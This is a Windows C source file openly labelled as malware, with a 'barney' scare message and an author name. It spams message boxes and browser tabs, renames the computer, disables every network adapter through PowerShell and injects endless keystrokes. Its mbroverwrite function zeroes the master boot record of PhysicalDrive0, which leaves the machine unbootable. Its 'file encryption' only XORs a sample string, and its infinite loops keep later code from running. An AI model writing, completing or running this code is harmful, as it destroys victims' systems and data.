#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>

void trollies();
void filebomb();
void registrycorruption();
void keyboardspam();
void mbroverwrite();
void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize);

int main()
{
    trollies();
    filebomb();
    registrycorruption();
    keyboardspam();
    mbroverwrite();
    return 0;
}

void mbroverwrite()
{
    char mbrData[512]; // 512 bytes
    ZeroMemory(&mbrData, sizeof(mbrData));

    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(MBR, mbrData, 512, NULL, NULL);
    CloseHandle(MBR);
}

void filebomb()
{
    FILE *fptr;
    while (true) 
    {
        fptr = fopen("filename.txt", "w");
        if (fptr != NULL) {
            fclose(fptr);
        }
    }
}

void registrycorruption()
{
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult;
    DWORD dwMyValue = 0;

    lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
                             "Software\\MyApp",
                             0,
                             NULL,
                             REG_OPTION_NON_VOLATILE,
                             KEY_ALL_ACCESS,
                             NULL,
                             &hKey,
                             &dwDisposition);

    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegSetValueEx(hKey,
                                "MyValue",
                                0,
                                REG_DWORD,
                                (BYTE*)&dwMyValue,
                                sizeof(DWORD));

        RegCloseKey(hKey);
    }
}

void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize)
{
    if (bytes == NULL || key == NULL)
        return;

    if (keysize > 1)
    {
        size_t j = 0;
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[j];
            j = (j + 1) % keysize;
        }
    }
    else
    {
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[0];
        }
    }
}

void keyboardspam()
{
    const char *text = "barney";
    INPUT inputs[6 * 2] = {0}; // Each character and its release

    for (int i = 0; i < 6; i++) {
        inputs[i * 2].type = inputs[i * 2 + 1].type = INPUT_KEYBOARD;
        inputs[i * 2].ki.wVk = inputs[i * 2 + 1].ki.wVk = toupper(text[i]);
        inputs[i * 2 + 1].ki.dwFlags = KEYEVENTF_KEYUP;
    }

    while (1) {
        // Send the input events
        SendInput(12, inputs, sizeof(INPUT));
    }
}

void trollies()
{

    printf("\n"
        "You got infected by barney,\n"
        "your computer isn't yours anymore but belongs to barney.\n"
        "You have 5 minutes to save your computer. Good luck :D\n\n"
        "                        Malware Author: Azrael\n");

    //Spam error message box
    for (int i = 0; i < 10; i++)
        MessageBox(
            NULL,
            "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
            "BARNEY",
            "BARNEY",
            MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
        );

    // Change wallpaper
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    // Change computer name
    SetComputerNameEx(ComputerNamePhysicalNetBIOS, "Barney");

    //Opens browser
    for (int i = 0; i < 20; i++) 
    {
        system("start https://www.google.com/search?q=barney+is+looking+for+you");
    }

    // Plays barney music
    PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);

    // Corrupts registry and files
    registrycorruption();

    // Disable Internet Connection
    system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");

    // Encrypts files
    unsigned char key[] = {0x00, 0xFF, 0x01, 0x0F};
    size_t keysize = sizeof(key);
    char text[] = "barneybarneymalware";
    crypter((unsigned char*)text, strlen(text), key, keysize); 
}
